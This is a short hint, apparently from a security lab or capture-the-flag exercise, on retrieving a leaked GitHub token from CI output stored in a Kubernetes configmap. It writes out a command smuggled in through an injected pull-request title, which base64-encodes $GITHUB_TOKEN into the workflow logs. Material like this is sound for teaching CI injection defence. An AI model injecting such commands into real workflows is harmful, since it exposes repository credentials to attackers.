Read the CI output: kubectl get configmap ci-output -n dojo-sec-ci -o jsonpath='{.data.output}' — look for a long base64-encoded string in the output.

The injected PR title caused the workflow to run: printf '%s' $GITHUB_TOKEN | base64 — the output of that command is the blob you see. Find the line that looks like base64 (long alphanumeric with == at end).
